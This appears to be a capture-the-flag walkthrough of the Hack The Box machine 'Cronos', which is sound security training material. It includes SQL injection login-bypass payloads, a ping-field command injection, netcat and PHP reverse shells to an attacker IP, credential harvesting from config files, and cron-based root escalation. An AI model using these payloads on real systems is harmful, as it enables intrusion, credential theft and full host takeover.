# Cronos - Medium

```sh
sudo vim /etc/hosts
# map cronos.htb

nmap -T4 -p- -A -Pn -v cronos.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
    * 53/tcp - domain - ISC BIND 9.10.3-P4
    * 80/tcp - http - Apache httpd 2.4.18

* On port 80, the webpage has a title 'Cronos' and includes links to Laravel framework and its docs; we need to enumerate further:

    ```sh
    # directory scan
    feroxbuster -u http://cronos.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

    # directory scan with other tool and other wordlist to make sure
    ffuf -u 'http://cronos.htb/FUZZ' -w /usr/share/wordlists/dirb/big.txt -e .php,.html,.bak,.bac,.md,.jpg,.png,.ps1,.js,.txt,.json,.docx,.pdf,.zip,.cgi,.sh,.pl,.aspx,.sql,.xml -s

    # check for any subdomains
    # first check without -fs to find size to be filtered
    ffuf -c -u 'http://cronos.htb' -H 'Host: FUZZ.cronos.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
    
    # add filter size
    ffuf -c -u 'http://cronos.htb' -H 'Host: FUZZ.cronos.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 11439 -s

    ffuf -c -u 'http://cronos.htb' -H 'Host: FUZZ.cronos.htb' -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -t 25 -fs 11439 -s
    # try with different wordlists
    ```

* After trying subdomain enumeration with the ```dns-Jhaddix.txt``` wordlist, we get a few hits - 'alpblog.cronos.htb' and 'admin.cronos.htb' - we can map the subdomains in ```/etc/hosts``` and enumerate them further

* 'alpblog.cronos.htb' is just a default Apache landing page; nothing found in source code so it is likely that it is a false result of subdomain enumeration, but we can enumerate this in case the other subdomain does not give anything

* 'admin.cronos.htb' shows a login page with username & password fields - default creds like 'admin:admin' or 'admin:password' do not seem to work, so we would have to enumerate further:

    ```sh
    # directory scan
    feroxbuster -u http://admin.cronos.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

    # check with another tool and wordlist
    ffuf -u 'http://admin.cronos.htb/FUZZ' -w /usr/share/wordlists/dirb/big.txt -e .php,.html,.bak,.bac,.md,.jpg,.png,.ps1,.js,.txt,.json,.docx,.pdf,.zip,.cgi,.sh,.pl,.aspx,.sql,.xml -s
    ```

* Directory scan gives us a few pages like 'config.php', 'logout.php', 'session.php' and 'welcome.php' - all of these are redirected to login page; using Burp Suite, we can intercept the requests to these pages and check for any clues

* Intercepting the request to 'welcome.php' shows the login session briefly - in the response (before redirection), we can see the title 'Net Tool v0.1', with options for 'traceroute' and 'ping' - but we get back to the login page after following redirection

* Before checking with bruteforce (as it takes more time), we can check for any injection attacks like SQLi:

    ```sh
    # intercept a login request to see how data is sent

    sqlmap -u 'http://admin.cronos.htb' --data='username=test&password=test' --level=5 --risk=3
    # check for SQLi
    # this works
    ```

* ```sqlmap``` gives us a few SQLi payloads that help us to login:

    * boolean-based blind: ```username=-2087' OR 7644=7644-- gkrN&password=test```
    * time-based blind: ```username=test' AND (SELECT 1400 FROM (SELECT(SLEEP(5)))MOjp)-- OLFu&password=test```

* Logging in gives us the page for 'Net Tool v0.1' as we checked earlier, and we can do traceroute or ping for any IP address in the input field

* The page source shows ```ping -c 1``` for the 'ping' utility - it is very likely that's the command being run in background, so we can test command injection with different characters like ```'```, ```"``` and ```;```

* Using payload ```8.8.8.8; id```, we manage to escape the ping command and inject 'id' to get output 'www-data' - so command injection works, and we can build on this to get a reverse shell

* After setting up a listener, using the payload ```8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.12.33 4444 >/tmp/f``` gives us a reverse shell on port 4444:

    ```sh
    whoami
    # www-data

    which python3
    # we have this, we can use it to stabilise our shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'

    export TERM=xterm
    # now Ctrl+Z to background shell

    stty raw -echo; fg
    # press Enter twice to enter stable reverse shell

    ls -la /home
    # we have user 'noulis'

    cat /home/user/noulis.txt
    # user flag

    # we can do basic enumeration with linpeas

    # on attacker
    python3 -m http.server

    # in reverse shell
    cd /tmp
    wget http://10.10.12.33:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* From ```linpeas```, we get a few findings:

    * a cronjob is run by root every minute - ```php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1```
    * from the file ```/var/www/laravel/config/database.php```, we get the SQLite DB name 'forge', without a password
    * from the file ```/var/www/lararvel/.env```, we get APP_KEY value '+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=', DB database & username 'homestead', and password 'secret'
    * cleartext creds for DB are found - 'admin:kEjdbRigfBHUREiNSDs'

* We can attempt logging into ```MySQL``` DB:

    ```sh
    # in reverse shell
    mysql -u admin -p
    # use the password found for admin - it works

    show databases;
    # we have a DB 'admin'

    use admin;

    show tables;

    select * from users;
    ```

* From the only entry in the 'users' table, we get the username 'admin' and password '4f5fffa7b2340178a716e3832451e058' - the value is a MD5 hash (we can confirm this by using online hash identifiers)

* Using online hash cracking tools, this hash gives us the string '1327663704' - but this string does not work as a password for 'noulis' or 'root'

* Going back to the cronjob, it runs ```/var/www/laravel/artisan``` every minute as root:

    ```sh
    ls -la /var/www/laravel/artisan
    # www-data has write permissions
    # we can modify this program to get reverse shell

    # on attacker, setup another listener
    nc -nvlp 4445

    # in reverse shell
    vim /var/www/laravel/artisan
    # use PHP reverse shell code

    # we get reverse shell on our listener
    cat /root/root.txt
    # root flag
    ```

    ```php
    <?php
    $sock=fsockopen("10.10.12.33",4445);
    exec("/bin/sh -i <&3 >&3 2>&3");
    ?>
    ```
